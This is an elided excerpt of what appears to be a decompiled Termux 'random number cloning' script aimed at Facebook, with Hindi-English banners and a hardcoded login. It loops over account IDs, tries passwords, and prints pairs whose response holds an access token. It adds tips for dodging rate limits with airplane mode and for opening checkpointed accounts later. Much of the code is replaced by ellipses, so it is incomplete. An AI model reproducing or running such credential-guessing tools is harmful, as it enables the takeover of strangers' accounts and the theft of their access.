...
# Decompiled By Yashika Sarang

# Youtube : https://youtube.com/c/Technicalboss07

# uncompyle6 version 

# Original written By Yashika Sarang
...
CorrectUsername = 'Yashika'

CorrectPassword = 'Sarang'
...
logo = """
TOOLS UPDATE DN 
/Ok ids ke liye channel subscribe kre  <::::::::::::::::[]
Dill mai aati hun samajh mai nhi          <::::::::::::::::[]
 ______________________________________________
Name toh suna hi hoga Inoxent Girl Yashika Hu Ywr

 Author   :            Yashika Sarang

 Facebook :          Yashika Sarang 

 Fb id Link   :        https://www.facebook.com/yashikasarang31

Version.       :.       Apne Babu ki Babu hu ywr 
...
def menu():
    ...
    yashika ('\x1b[1;96m[1] START Random Number Cloning ')
...
def action():
    ...
    yashika ('\x1b[1;97mUse without internet sim.minimize termux and check every 10 minutes  later. airplane mode use every 10 mint.')

    print(47*'-')

    xxx = str(len(id))

    yashika('\x1b[1;97m              TOTAL IDS :\x1b[1;95m ' + xxx)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  YashikaSarang- ok  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  YashikaSarang-Ok ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  YashikaSarang-Ok ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  YashikaSarang-ok  ' + k + c + user + '  |  ' + pass3
    ...
    yashika('Note : Cp account  10 say 12 days BAD OPEN KRY')
